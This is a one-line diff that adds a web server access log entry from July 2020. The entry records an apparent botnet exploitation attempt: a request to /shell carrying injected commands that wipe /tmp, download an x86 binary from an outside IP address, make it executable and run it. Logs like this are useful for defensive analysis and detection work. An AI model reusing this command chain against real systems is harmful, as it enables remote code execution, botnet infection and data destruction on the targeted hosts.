@@ -1,0 +1,1 @@
+114.141.54.106 - - [01/Jul/2020:18:40:28 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.172.111.214/bins/UnHAnaAW.x86;chmod+777+/tmp/UnHAnaAW.x86;sh+/tmp/UnHAnaAW.x86 HTTP/1.1" 301 162 "-" "-" "Hello, world"
